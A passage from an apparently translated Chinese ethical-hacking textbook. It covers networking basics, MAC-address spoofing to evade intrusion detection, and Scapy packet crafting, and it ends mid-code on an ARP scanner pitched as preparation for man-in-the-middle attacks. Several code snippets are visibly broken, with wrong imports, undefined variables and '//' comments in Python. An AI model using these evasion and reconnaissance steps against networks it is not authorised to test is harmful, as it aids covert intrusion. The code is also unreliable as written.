+  \ 3.5 – 按规模划分的网络\n\n到目前为止，我们讨论了网络的物理组件和不同类型的网络。这让我们对计算机网络有一个概览。现在我们了解了网络的基础知识，就可以开始深入探讨数据如何在网络中从一个设备传输到另一个设备。\n\
+  \n## 网络栈\n\n上一节为我们提供了网络的高层次介绍。现在，我们将学习实际的位和片段是如何在网络上传输的。\n\n## OSI 模型简介\n\n从你在应用程序上输入消息到它被交付给预期接收者，你的消息会经过通信系统中的不同层。为了帮助我们理解数据在到达目的地之前经过的所有通信过程和媒介，提出了一个框架来描述网络系统的功能。这个模型被称为开放系统互连（OSI）模型。这个模型不一定只适用于因特网，也可以应用于任何现代通信系统：\n\
+  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_68_0.png)\n\n图 3.6 – 7 层 OSI 栈\n\nOSI\
+  \ 模型包含 7 层，用来概念化数据如何在任何电子通信媒介上传输。让我们更详细地了解这些层。\n\n## 应用层\n\n应用层是 OSI 栈的最上层。这是用户交互的层。你使用的任何联网设备可能都有一个应用层界面。它充当用户输入/输出的端点。你发送的任何数据都会被添加到应用层，而你从他人接收的任何数据都会通过这一层显示。\n\
+  \n## 表示层\n\n这一层位于应用层之下，负责将数据转换为有用的格式。来自应用层的数据格式各不相同，通常对通信系统来说并不是最易读的形式。在这里，数据会被转换为合适的形式。此外，用户数据在应用层并未加密。在表示层，通常会为数据添加加密以确保安全。\n\
+  \n## 会话层\n\n在表示层之下是会话层。一旦数据准备好发送，发送设备和接收设备必须建立连接，以便它们可以通过通道发送数据。会话层正是帮助完成这一任务的——它在你的设备与接收设备之间建立连接。\n\
+  \n## 传输层\n\n一旦两个设备之间建立了会话，数据就可以通过通道发送。传输层将要发送的实际数据划分为更小且可管理的块，称为 *段*，这些块可以通过链路发送。它还负责接收来自其他设备的数据段并重新组装以供你使用。\n\
+  \n传输层还负责流量控制和错误控制。不同的传输媒介具有不同的速度和不同的错误率。传输层的工作是确保正确的数据被传输。\n\n## 网络层\n\n当我们想要与不在同一网络中的设备通信时，网络层的角色就发挥作用了。网络层将来自传输层的\
+  \ *段* 进一步分解为更小的 *数据包*。网络层还确定数据包到达目的地的最佳路径。\n\n## 数据链路层\n\n这与网络层 somewhat 相似；然而，它促进同一网络中设备之间的通信。数据链路层将数据包分解为帧。\n\
+  \n## 物理层\n\n这是栈的最底层，也是用户输入的数据被转换为可通过传输媒介传输的物理信号的地方。在数字系统的情况下，这意味着数据的 0 和 1 被转换为物理系统中的合适表示，例如电压电平。\n\
+  \n## 完整周期\n\n通信的完整周期如下：\n\n## 开放系统互连模型\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_70_0.png)\n\
+  \n图 3.7 – OSI 栈中的数据传输\n\n用户输入的数据从应用层到物理层，然后在另一端从物理层到应用层。\n\n## TCP/IP 模型\n\n前面显示的模型是一个非常通用的模型，用来概念化任何媒介中的通信。然而，计算机网络的工作方式是\
+  \ OSI 模型的一个特例，通常被称为 TCP/IP 模型。你经常会在文献中看到这个模型，而不是更通用的 OSI 模型：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_70_1.png)\n\
+  \n图 3.8 – TCP/IP 栈\n\n与具有七层的 OSI 模型相比，因特网栈有四层。让我们更详细地了解它们。\n\n## 应用层\n\n这是最上层。该层负责进程到进程的通信。常见的应用层协议包括\
+  \ HTTP、FTP、SSH、DNS 等。\n\n## 传输层\n\nTCP 和 UDP 是该层的常见协议。该层负责端到端通信和错误控制。TCP 是面向连接的，而\
+  \ UDP 是无连接协议。\n\n## 因特网层\n\n这一层与 OSI 栈中的网络层相对应。它定义了负责在节点之间逻辑传输数据的协议。其中最著名的协议之一是\
+  \ IP 协议，它使用 IP 地址在设备之间通信。\n\n## 网络访问层\n\n这一层结合了 OSI 栈中的数据链路层和物理层。\n\n## 映射 OSI 和\
+  \ TCP/IP 栈\n\nOSI 和 TCP/IP 栈的层映射如下：\n\n| OSI 模型 | TCP/IP 模型 |\n|---|---|\n| 应用层\
+  \ | 应用层 |\n| 表示层 | |\n| 会话层 | |\n| 传输层 | 传输层 |\n| 网络层 | 因特网层 |\n| 数据链路层 | 链路层 |\n\
+  | 物理层 | |\n\n图 3.9 – TCP/IP 和 OSI 栈的映射\n\n## 公共 IP 地址与私有 IP 地址\n\n公共 IP 地址与私有 IP\
+  \ 地址的主要区别如下：\n\n| 公共 IP | 私有 IP |\n|---|---|\n| 公共 IP 是因特网所看到的 IP 地址。 | 私有 IP 用于你的本地网络内部。\
+  \ |\n| 允许直接访问。 | 你家庭网络中设备的 IP 地址。 |\n| 全球唯一。 | 可以被视为一个昵称。 |\n| 当你在 Google 中输入我的\
+  \ IP 地址时看到的就是它。 | 在 Windows 或 Linux/macOS 中使用 ipconfig 或 ifconfig 查找此地址。 |\n|  |\
+  \ 全球不唯一。相同的 IP 可以在不同的网络中使用。 |\n|  | 通常形式为 192.168.1.X，其中 X 在 1-255 之间。注意，这可能因你的网络配置而异。\
+  \ |\n\n表 3.2 – 公共 IP 地址与私有 IP 地址之间的差异\n\n我们迄今为止看到的 IP 地址是 IPv4 地址，它们非常流行。然而，还有其他地址。让我们来看看。\n\
+  \n## IPv4 与 IPv6\n\n到目前为止，我们所了解的 IP 地址称为 IPv4 地址。还有另一种 IP 地址版本称为 IPv6。这些是 128 位地址。它们被创建用于未来的计算系统。然而，由于\
+  \ NAT 协议的使用，其采用速度缓慢。目前，只有 40% 的因特网支持 IPv6 地址。\n\n## MAC 地址\n\nMAC 地址也称为硬件地址，通常与\
+  \ NIC 卡相关联。每个 NIC 都有自己的 MAC 地址。MAC 地址是由制造商分配的物理号码。每个制造商都被分配一个号码池，可用于制造其产品。MAC 地址是一个\
+  \ 48 位数字：\n\n\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_75_0.png)\n\nFigure 3.11\
+  \ – MAC address bytes\n\n接下来，让我们讨论端口。\n\n## Ports\n\n虽然 MAC 地址唯一标识了 NIC，数据使用它来识别应该发送到的正确设备，但端口标识了\
+  \ PC 上运行的唯一服务。它充当通信的逻辑端点。每个设备都有多个应用程序通过网络发送或接收数据。例如，你可以在 PC 上浏览网页，同时在后台运行下载，另一个服务正在向服务器上传数据。一旦数据到达你的\
+  \ PC，它会使用端口来区分数据所属的不同进程。系统总共有 65,535 个端口。其中前 1,024 个中有一些是保留的，不建议使用这些端口。\n\n## Protection\n\
+  \n到目前为止，本章我们学习了计算机网络的基础知识，这对于理解本书的其余部分至关重要。现在，我们将开始研究可以用哪些参数来追踪我们，以及我们如何保护自己。在上一章中，我们了解到道德黑客的第一步是信息收集。但在开始收集信息之前，我们必须确保我们的身份得到保护。否则，我们很容易被追踪。你的身份可以通过许多参数被追溯回你。最常见的是你的\
+  \ IP 地址和你的 MAC 地址。\n\n要掩盖你的公共 IP 地址，你可以使用 **Virtual Private Networks (VPNs)**。我们不会讨论\
+  \ VPN，因为它们不在本书的范围之内。这里需要注意的一点是，你不应完全信任你的 VPN 提供商。从安全角度来看，使用 VPN 只是意味着你将信任从你的 **internet\
+  \ service provider (ISP)** 转移到另一家提供 VPN 服务的公司。你在选择 VPN 时应非常谨慎，从网络安全角度来看，你应非常谨慎对待免费\
+  \ VPN，因为其中很多捆绑了恶意软件或使用你的 PC 资源用于其他目的，例如比特币挖矿。一些 VPN 即使声称可以掩盖你的身份，也会泄露你的 **domain\
+  \ name server (DNS)**，即用于将网站名称映射到 IP 地址的服务器。\n\n然而，当我们扫描本地网络时，我们可以通过 MAC 地址被追踪。在\
+  \ *Chapter 2, Getting Started – Setting Up Your Lab Environment* 中，我们安装了两台虚拟机：Kali\
+  \ 和 Windows 10。Kali 机器将是我们攻击机。我们的机器有一个 NIC，用于与其他设备通信。该 NIC 有一个 MAC 地址。在 *Changing\
+  \ our MAC address* 部分，我们将尝试伪造一个 MAC 地址，以便在扫描时更改它。通过这样做，即使 **intrusion detection\
+  \ system (IDS)** 发现我们在扫描 PC 上的端口，它也找不到我们的真实 MAC 地址。\n\n## Changing our MAC address\n\
+  \n在本节中，我们将尝试在 Kali 机器上更改 MAC 地址。让我们启动 Kali 机器并打开一个终端。要更改 MAC 地址，你需要安装 net-tools\
+  \ 包。在大多数 Linux 发行版中，该工具已经可用。但是，如果未安装，你可以使用以下命令安装它：\n\n```\nsudo apt-get update -y\n\
+  ```\n\n```\nsudo apt-get install -y net-tools\n```\n\n它会提示你输入密码，即 kali。安装工具后，你可以使用以下命令查看\
+  \ MAC 地址：\n\n```\nsudo ifconfig\n```\n\n如果一切顺利，你将看到类似以下的输出：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_77_0.png)\n\
+  \nFigure 3.12 – ifconfig command output\n\n这里有很多内容需要解析，让我们逐步分解。这里有两个值，称为 eth0 和\
+  \ lo。eth0 是 NIC 的名称，而 lo 是回环适配器。现在我们可以忽略回环适配器。inet 字段代表 Kali 机器的私有 IP 地址。inet6 是\
+  \ Kali 机器的 IPv6 地址。ether 是 MAC 地址，这就是我们想要更改的字段。\n\n如果你想更改 MAC 地址，不能在 NIC 开启时进行。首先，你必须关闭网络接口。要关闭接口，你可以使用以下命令：\n\
+  \n```\nsudo ifconfig eth0 down\n```\n\n此命令将关闭名为 eth0 的 NIC。如果命令输出中没有错误，这意味着命令成功运行。\n\
+  \n现在，如果你再次输入 ifconfig 命令，你将看到以下输出：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_77_1.png)\n\
+  \nFigure 3.13 – Shutting down a network interface card\n\n现在，你将只看到回环适配器，并且 eth0\
+  \ 已被关闭。要更改 MAC 地址，你可以运行以下命令。假设你希望新的 MAC 地址为 00:11:22:33:44:55。这里，你可以执行以下操作：\n\n\
+  ```\nsudo ifconfig eth0 hw ether 00:11:22:33:44:55\n```\n\n此命令更改 eth0 接口和该 NIC 的\
+  \ ether 参数：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_78_0.png)\n\nFigure 3.14\
+  \ – Changing MAC address\n\n现在，如果没有错误，这意味着命令成功运行。此时，我们可以通过运行以下命令再次打开接口：\n\n```\n\
+  sudo ifconfig eth0 up\n```\n\n现在，让我们再次运行 ifconfig 命令，看看我们的更改是否生效：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_78_1.png)\n\
+  \nFigure 3.15 – Changed MAC address\n\n在这里，你可以看到 MAC 地址已成功更改。现在，如果我们想在网络中扫描某物，将显示此\
+  \ MAC 地址而不是我们的真实 MAC 地址。\n\n## Creating a Python script\n\n到目前为止，我们已经编写了手动命令来更改\
+  \ MAC。理想情况下，我们希望编写一个 Python 脚本来帮助我们更改它。为此，我们需要找到一种方法借助 Python 运行 bash 命令。幸运的是，Python\
+  \ 有一个标准库用于运行系统命令，称为 subprocess。该库允许你与底层操作系统交互。\n\n要将此库导入你的模块，你只需编写以下命令：\n\n```\n\
+  import subprocess\n```\n\n要运行命令，subprocess 有一个名为 run 的方法。使用此方法，你可以在操作系统上执行系统命令。如果你想查看\
+  \ eth0 的信息，你可以运行以下命令：\n\n```\nsubprocess.run(\n    [\"ifconfig\", \"eth0\"],\n \
+  \   shell=True,\n)\n```\n\n此函数需要一个命令列表。另一个参数 shell=true 意味着我们希望将输出打印到控制台。\n\n如果你运行前一个文件，你将看到类似于运行\
+  \ ifconfig eth0 命令的输出。请注意，你需要以 root 用户身份运行命令，因此它应如下所示：\n\n```\nsudo python3 main.py\n\
+  ```\n\n以下是输出：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_80_0.png)\n\nFigure 3.16\
+  \ – Running system commands using Python\n\n现在你知道了如何使用 Python 运行系统命令，你可以使用 Python\
+  \ 重复前面的命令。完整代码如下：\n\n```\nimport subprocess\n\nif __name__ == \"__main__\":\n  \
+  \  interface = \"eth0\"\n    new_mac = \"22:11:22:33:44:57\"\n\n    print(\"Shutting\
+  \ down the interface\")\n    subprocess.run([\"ifconfig\", \"eth0\", \"down\"])\n\
+  \n    print(\"changing the interface hw address of \", interface, \" to \", new_mac)\n\
+  \    subprocess.run([\"ifconfig\", interface, \"hw\", \"ether\", new_mac])\n   \
+  \ print(\"MAC address changed to \", new_mac)\n    subprocess.run([\"ifconfig\"\
+  , interface, \"up\"])\n\n    print(\"network interfaced turned on\")\n```\n\n如果你再次检查接口，你将能够看到新的\
+  \ MAC 地址：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_81_0.png)\n\nFigure 3.17 –\
+  \ New MAC address\n\n现在我们已经学习了如何在系统上运行命令以及如何使用 Python 更改系统的 MAC 地址，我们将在此停止讨论。在下一章中，我们将研究信息收集。\n\
+  \n## Summary\n\n在本章中，我们学习了网络的基础知识，以及我们如何通过伪造 MAC 地址来保护自己在本地网络上的扫描目的。本章帮助我们更深入地了解计算机系统的网络方面，以及我们如何使用\
+  \ Python 来保护和掩盖我们在本地网络中的身份。在下一章中，我们将学习如何扫描本地网络。\n\n\n\n\n"
+- "# 4 网络扫描\n\n本章介绍道德黑客的第一阶段：信息收集和侦察。信息收集是道德黑客最重要的方面之一。如果没有获得所需信息的适当访问权限，要成功实施攻击将极其困难。我们将学习什么是网络扫描以及它如何用于在网络中实施攻击。本章将介绍以下主题：\n\
+  \n- 网络简介\n- TCP/IP 中的数据封装\n- Scapy 简介\n- ARP 简介\n- 基于 ARP 的 Scapy 网络扫描器\n\n### 网络简介\n\
+  \n在第 3 章《侦察和信息收集》中，我们从非常高的角度学习了网络的基础知识。我们了解了网络中存在的不同组件和设备，以及每个组件的作用。在本节中，我们将更深入地了解在网络上传输的实际数据包和数据。\n\
+  \n### 数字系统中的数据表示\n\n让我们首先了解你的计算机系统如何管理在网络上传输数据。计算机系统中数据的每个部分都由 **二进制逻辑电平** 定义。这些电平定义为\
+  \ *低* 或 *高*。现代计算系统中存储的每张图像、文件、视频、语音记录或任何其他内容都由这些逻辑电平表示。在物理硬件中，这些电平映射为电压电平或开关状态。例如，在数字系统中，5\
+  \ V 电压可能代表高逻辑，0 V 电压将代表低逻辑。你可能会想知道这些不同类型的数据是如何用逻辑电平表示的。让我们看看它是如何工作的。假设你想向朋友发送消息\
+  \ Hello。为了简单起见，假设你的朋友在同一网络中。现在，我们假设底层通信是可行的。现在，为了发送这条 Hello 消息，我们需要将此消息转换为计算机可理解的形式。我们刚刚了解到计算机只理解低和高逻辑电平，所以我们必须将我们的消息\
+  \ *编码* 为这些逻辑电平。现在，正如我们所见，Hello 包含五个字母，而我们只有两个逻辑电平，因此仅用一个 *实例* 的两个电平是不可能对完整消息进行编码的。这个实例称为\
+  \ **位**。为了实现这种编码，开发了一种系统，称为 **美国信息交换标准代码（ASCII）**。使用这种编码方案，我们可以轻松表示英文字母以及一些其他符号和字母。英语字母表的每个字母都由称为\
+  \ *字节* 的 8 位序列表示。为了表示我们的 Hello 消息中的字母 H，我们可以将其编码为以下位序列。H 在 ASCII 格式中为 01001000。该值在\
+  \ ASCII 代码表中预定义；同样，其他字符也在相同格式中定义：\n\n- H = 01001000\n- e = 01000101\n- l = 01101100\n\
+  - l = 01101100\n- o = 01101111\n\n现在我们有一个数据流，可以使用任何数字系统发送。请注意，这是对数据表示的非常简化的解释。实际系统还使用其他编码，例如\
+  \ Unicode 和字节表示，以发送复杂数据。\n\n### 数据封装\n\n现在我们了解了数据表示，让我们将注意力转回我们最初的话题，即如何发送这些数据。我们已经了解了\
+  \ TCP/IP 栈中的不同层以及它们如何用于发送数据。在前一节中，我们说我们想向本地网络中的某人发送 Hello 消息。让我们称此消息为我们的数据：\n\n\
+  | H | e | l | l | o |\n|---|---|---|---|---|\n| 01001000 | 01000101 | 01101100 |\
+  \ 01101100 | 01101111 |\n\n图 4.1 – 数据表示\n\n现在，为了使其成功到达另一台计算机，数据包必须知道其确切目的地，就像邮政投递系统的工作方式一样。你有一个国家、城市、邮政编码、街道和房屋号码。在数字系统中，你有\
+  \ IP 地址、MAC 地址以及源端口和目的端口。假设你在浏览器应用程序中写下你的消息，你的朋友也在他们的浏览器中等待你的消息。为了成功地将消息发送到目标计算机中的完全相同的进程，IP\
+  \ 协议将为你的消息添加一个新报头。\n\n从最上层开始，添加了 **应用层报头**。同样，应用层以下的每一层都会添加自己的报头。整体过程如图所示 4.2。图\
+  \ 4.2 显示了数据在通过网络发送之前在 TCP/IP 栈中的封装方式。我们将学习这些段中的每一个包含什么内容以及这如何帮助数据包到达其目的地：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_86_0.png)\n\
+  \n图 4.2 – 数据封装\n\n我们将在下一节中详细介绍这些段。\n\n### 数据包投递过程\n\n数据包投递过程取决于目标设备是否位于同一本地网络中。如果设备位于同一子网中，我们可以直接使用以太网地址发送数据。这些报头中包含大量信息，对于本书的范围而言，你不会关心其中大部分，我只会解释与本书相关的字段。\n\
+  \n### IP 报头\n\n接下来，添加一个 IP 报头，如图 4.4 所示：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_88_0.png)\n\
+  \n图 4.4 – IP 报头\n\n这里，我们感兴趣的字段是源 IP 和目的 IP。这定义了你的数据包将去往何处以及它来自何处。一旦添加了 IP 报头，它就被称为\
+  \ IP 数据报。\n\n### 以太网报头\n\n以太网报头有助于数据在本地网络中导航。这里最重要的字段是源 MAC 地址和目的 MAC 地址。顾名思义，源\
+  \ MAC 地址将是你的 MAC 地址，目的地将是本地网络中接收者的 MAC 地址：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_88_1.png)\n\
+  \n图 4.5 – 以太网报头\n\n一旦添加了以太网报头，它现在就被称为 *以太网帧*。我们已经了解了在网络上传输的数据包中最重要的字段。我们还了解了数据如何被封装以及它使用哪些字段在网络上传输。在下一节中，我们将学习如何使用我们刚刚学到的信息创建我们的网络扫描器。\n\
+  \n### Scapy 简介\n\n为了创建网络扫描器，我们将使用一个名为 Scapy 的 Python 网络库。该库设计用于发送、嗅探、拆解和编辑网络数据包。Scapy\
+  \ 是一个非常强大的网络数据包操作工具。要了解有关该工具的更多信息，你可以访问以下链接：https://scapy.readthedocs.io/en/latest/introduction.html。\n\
+  \n### 安装 Scapy\n\n要安装 Scapy，首先打开终端。让我们先了解一些事情。在 Linux 中，有两种用户权限，用户和 root，并且两个用户的环境不同。系统级命令需要更高的权限。为了发送和接收数据包，我们需要将\
+  \ Scapy 安装为 root 用户以及普通用户。我们将以普通用户身份编写程序，并在运行时以 root 身份运行它，因为在 Linux 中发送数据包需要更高的权限（你可以将其视为\
+  \ Windows 中的 *以管理员身份运行* 等效项）。你很快就会明白我的意思。要以 root 用户身份安装 Scapy，请输入以下命令：\n\n```\n\
+  sudo pip3 install scapy\n```\n\n这将以管理员权限安装 Scapy。完成后，打开你的 Visual Studio Code 并为新项目创建一个新文件夹。我们将此文件夹命名为\
+  \ `example2-introduction-scapy`。\n\n请注意，如果你遇到一些问题，你将需要使用以下命令更新系统的 Python：\n\n```\n\
+  sudo apt-get update && sudo apt-get upgrade && sudo apt-get install python3-virtualenv\
+  \ -y\n```\n\n现在，我们将为此特定项目创建一个新的虚拟环境。要创建新的虚拟环境，请导航到刚刚创建的文件夹目录并输入以下命令：\n\n```\npython3\
+  \ -m venv venv\n```\n\n\n现在，如果一切都操作正确，你将看到一个名为 venv 的文件夹被创建。\n\n接下来，通过运行以下命令激活虚拟环境：\n\
+  \n```\nsource venv/bin/activate\n```\n\n现在，你的虚拟环境应该已激活。激活后，你可以通过输入以下命令查看环境中已安装的软件包：\n\
+  \n```\npip freeze\n```\n\n如果你在环境中已安装了一些软件包，它们将被列出；否则，你将看不到任何内容。现在，要安装 Scapy，编写以下命令：\n\
+  \n```\npip3 install scapy\n```\n\n这需要一些时间来安装。完成后，你可以再次编写 pip freeze 命令来查看已安装的软件包：\n\
+  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_90_0.png)\n\n在本节中，我们学习了如何在虚拟环境中安装 Scapy\
+  \ 以及如何查看其是否已正确安装。请注意，Scapy 的某些功能要求程序以更高权限运行，否则它们将无法工作。在下一节中，我们将了解有关 Scapy 的更多使用方法以及如何使用\
+  \ Scapy 操作网络数据包。\n\n## 理解 Scapy 的工作原理\n\n在本部分，我们将学习 Scapy 的工作原理以及如何使用它来创建自己的网络操作工具。让我们创建一个名为\
+  \ main.py 的新文件并打开它。打开文件后，我们可以在文件中导入任何 Scapy 模块。在本节中，我们将创建一个向任何网站发送的小型 ping 请求。Ping\
+  \ 请求通常用于测试设备是否可用。Ping 请求（也称为回显请求）使用底层 ICMP 应用层协议。要在程序中导入一个包，编写以下代码：\n\n```\nfrom\
+  \ scapy.all import scapy\n```\n\n> **重要提示**\n> 请注意，在最新版本的 Kali Linux 中，一些依赖项已更改，你可能会看到与缺少文件相关的错误。要纠正此问题，你可以编写以下命令：\n\
+  > `cd /usr/lib/x86_64-linux-gnu/sudo ln -s -f libc.a liblibc.a`\n\n要发送 ping 请求，你需要创建一个\
+  \ IP 层数据包，这将帮助你设置源和目标 IP 地址。要导入 IP 层，我们可以编写以下命令：\n\n```\nfrom scapy.all import IP\n\
+  ```\n\n最后，要发送和接收数据包，我们可以使用一个名为 sr 的函数。要导入此函数，使用以下命令：\n\n```\nfrom scapy.all import\
+  \ sr\n```\n\n此 IP 会根据你的系统而有所不同。你可以使用 sudo ifconfig 命令找到此 IP。\n\n然后，我们将定义我们的源和目标\
+  \ IP：\n\n```\nsrc_ip = \"192.168.74.128\"\n```\n\n然后，我们将定义目标 IP。我们希望向 google.com\
+  \ 服务器创建一个 ping 请求。你可以手动编写此服务器的 IP 地址，你可以通过在终端中编写 ping www.google.com 来找到它，或者你可以直接给出\
+  \ www.google.com。\n\nScapy 将自动转换此地址：\n\n```\ndest_ip = \"www.google.com\"\n```\n\
+  \n现在，我们将创建一个 ip_layer 数据包并打印出来以查看其包含的内容：\n\n```\nfrom scapy.all import ICMP\nfrom\
+  \ scapy.all import IP\nfrom scapy.all import sr\n\nif __name__ == \"__main__\":\n\
+  \    src_ip = \"192.168.74.128\"\n```\n\n接下来，要发送 ICMP 请求，你可以调用类来创建实例，如下所示：\n\n```\n\
+  icmp_req = ICMP(id=100)\n```\n\nid=100 有助于协议追踪数据包。要查看此请求中存在哪些字段，你可以编写以下命令：\n\n```\n\
+  print(icmp_req.show())\n```\n\n结果将看起来像这样：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_93_0.png)\n\
+  \n图 4.8 – ICMP 数据包内容\n\n从这里，你可以看到数据包类型是回显请求，用于测试连接可用性。\n\n根据我们之前的讨论，我们知道应用层位于 IP\
+  \ 层之上，我们到目前为止已创建了两个层。现在，下一个目标是将这两个层组合成一个可以在网络上传送的单个数据包。为此，我们可以编写以下代码：\n\n```\npacket\
+  \ = ip_layer / icmp_req\n```\n\n```\nprint(packet.show())\n```\n\n这将列出组合后的数据包。请注意\
+  \ / 运算符。此运算符用于在 Scapy 中组合不同的层。你从较低层开始并继续使用此 / 运算符添加新层。打印结果将显示数据包的结果，其中之前的层组合成一个：\n\
+  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_94_0.png)\n\n图 4.9 – 组合的层\n\n现在，我们的请求已准备好发送。要发送它，我们可以使用我们已导入的\
+  \ sr1 方法：\n\n```\nresponse = sr1(packet, iface=\"eth0\")\nif response:\n    print(response.show())\n\
+  ```\n\n响应将看起来像这样：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_95_0.png)\n\n图 4.10\
+  \ – ICMP 回复\n\n你可以看到响应类型是 echo-reply，回复中的 src 字段是回复此 ping 请求的服务器的 IP 地址。\n\n现在你已经学会了如何使用\
+  \ Python 制作和发送数据包。理论上，你可以用 Scapy 创建任何网络应用程序。\n\n前面提到的发送数据包的完整代码如下所示：\n\n```\nfrom\
+  \ scapy.all import ICMP\nfrom scapy.all import IP\nfrom scapy.all import sr\n\n\
+  if __name__ == \"__main__\":\n    src_ip = \"192.168.74.128\"\n    dest_ip = \"\
+  www.google.com\"\n    ip_layer = IP(src = src_ip, dst = dest_ip)\n    icmp_req =\
+  \ ICMP(id=100)\n```\n\n```\npacket = ip_layer / icmp_req\nresponse = sr(packet,\
+  \ iface=\"eth0\")\n// to see available interfaces, write ifconfig command in\n//\
+  \ terminal\nif response:\n    print(response.show())\n```\n\nScapy 的好处在于它允许你创建 raw_packets，这意味着即使是包含错误信息的数据包（畸形数据包）也可以创建，并且没有机制来检查数据包是否具有正确的值。你可以更改计算机上的\
+  \ src ip 字段并放入其他数据包的值，在某些情况下，目标将无法知道哪个 PC 实际生成了这些数据包（空闲扫描）。这样，你就可以伪造数据包。\n\n所以，到目前为止，我们已经了解了\
+  \ IP 堆栈和头部字段。我们还学习了如何安装 Scapy 并使用它来创建可以在网络上传送的原始数据包。现在，让我们看一下一些有用的函数，这将帮助我们更详细地了解\
+  \ Scapy 的工作原理。\n\n如果你想了解 Scapy 中某个特定层的更多详细信息以及该层中可用的选项以进行修改，你可以使用 Scapy 中的 ls 函数。要导入此函数，你可以使用此命令：\n\
+  \n```\nfrom scapy.all import ls, IP\n```\n\n要获取有关 ip_layer 的信息，我们可以像这样打印 ls：\n\n\
+  ```\ndest_ip = \"www.google.com\"\nip_layer = IP(dst = dest_ip)\nprint(ls(ip_layer))\n\
+  ```\n\n在下一个屏幕截图中，你将看到之前提到的代码的执行。屏幕截图显示了 IP 数据包中的字段列表：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_97_0.png)\n\
+  \n图 4.11 – ls 函数\n\n如果你想访问任何层的单个字段，你可以简单地使用点（.）运算符。例如，如果你想打印 ip_layer 中的 dst，你可以编写以下代码：\n\
+  \n```\nip_layer = IP(dst = dest_ip)\nprint(\"Destination = \", ip_layer.dst)\n```\n\
+  \n结果如下：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_97_1.png)\n\n图 4.12 – 访问单个字段\n\
+  \n如果你想查看层的快速摘要，你可以在层上调用 summary 方法：\n\n```\nprint(\"Summary = \", ip_layer.summary())\n\
+  ```\n\n摘要结果将如下所示：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_97_2.png)\n\n图 4.13\
+  \ – 层摘要\n\n所以现在，我们已经熟悉了 Scapy 及其工作原理。我们学习了如何创建基本数据包以及如何操作这些数据包。在下一节中，我们将转向如何使用 Scapy\
+  \ 进行信息收集。\n\n## 使用 Scapy 的网络扫描器\n\n在本节中，我们将创建一个简单的扫描器，扫描我们本地网络中的主机并查找它们的 MAC 地址。为了创建扫描器，我们首先需要了解地址解析协议（ARP）是什么以及它如何用于创建网络扫描器。\n\
+  \n### 地址解析协议\n\nARP 在最简单的形式上是一种转换工具，帮助我们将 IP 地址转换为 MAC 地址。每当一台设备需要在同一本地网络内与另一台设备通信时，它需要该设备的\
+  \ MAC 地址。IP 地址不用于本地通信。\n\n假设设备 A 想要与本地网络中的设备 B 通信。为了找到设备 B 的 MAC 地址，计算机 A 首先会在其内部维护的一个名为\
+  \ ARP 缓存的列表中查找，以查看计算机 B 的 IP 地址是否已映射到其表中的物理 MAC 地址。这也称为 ARP 表。你可以通过输入 arp -a 命令来检查你的\
+  \ PC 上的 ARP 表。\n\n以下是 Kali Linux 上运行 arp -a 命令的结果：\n\n```\n(venv) —(kali@kali)-[~/packt-book-code/example2-introduction-scapy]\n\
+  └$ arp -a\n? (192.168.74.2) at 00:50:56:ff:74:8b [ether] on eth0\n? (192.168.74.254)\
+  \ at 00:50:56:f8:e6:bc [ether] on eth0\n```\n\n图 4.14 – ARP 表\n\n你可以看到它列出了 IP 地址和与之关联的\
+  \ MAC 地址。你也可以在 Windows 中使用相同的命令。\n\n如果请求的设备的相应 MAC 地址在本地不存在，设备 A 将向整个网络发送广播请求，询问哪个设备具有相应的\
+  \ IP。在我们的例子中，它将是设备 B。那些不是设备 B 的设备将忽略此请求，而设备 B 将回复设备 B 的相应 MAC 地址。这样，设备 A 将得知设备 B\
+  \ 的 MAC 地址。一旦两个设备相互得知，它们之间的通信就可以进行。一旦设备 A 得到设备 B 的 MAC 地址，它将更新其 ARP 表。图 4.15 显示了源设备如何生成\
+  \ ARP 请求以及目标设备如何使用正确的 MAC 地址进行回复：\n\n\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_99_0.png)\n\
+  \nFigure 4.15 – ARP 请求\n\n现在我们了解了 ARP 的工作原理，我们就可以开始使用 Scapy 创建自己的 ARP 扫描器来查找这些设备的\
+  \ MAC 地址。你可能会想知道为什么我们需要 ARP 扫描器。好吧，了解设备的 MAC 地址可以帮助我们执行中间人攻击，我们将在第 5 章《中间人攻击》中执行此操作。\n\
+  \n## 使用 Scapy 的 ARP 扫描器\n\nARP 协议工作在以太网层，因此使用 Scapy，我们将导入以太网层。让我们导入我们将使用的层和函数：\n\
+  \n```\nfrom scapy.all import Ether, ARP, srp\n```\n\n如果 MAC 地址的所有位都设置为 1，则意味着该数据包是广播，并且应该发送到网络中的每个设备。Scapy\
+  \ 使用十六进制表示法，因此我们将创建以下变量来表示广播地址：\n\n```\nbroadcast = \"FF:FF:FF:FF:FF:FF\"\n```\n\
+  \n然后，我们可以创建一个以太网层数据包并将目标设置为广播。\n\n我们还需要定义要扫描的 IP 范围。在我的例子中，我想扫描我的本地网络：\n\n```\n\
+  ip_range = \"192.168.74.1/24\"\n```\n\n完整的代码看起来像这样：\n\n```\nfrom scapy.all import\
+  \ Ether, ARP, srp\n\nif __name__ == \"__main__\":\n    broadcast = \"FF:FF:FF:FF:FF:FF\"\
+  \n    ether_layer = Ether(dst = broadcast)\n    ip_range = \"192.168.74.1/24\"\n\
+  \    arp_layer = ARP(pdst = ip_range)\n\n    packet = ether_layer / arp_layer\n\n\
+  \    ans, unans = srp(packet, iface = \"eth0\", timeout=2)\n\n    for snd, rcv in\
+  \ ans:\n        ip = rcv[ARP].psrc\n        mac = rcv[Ether].src\n        print(\"\
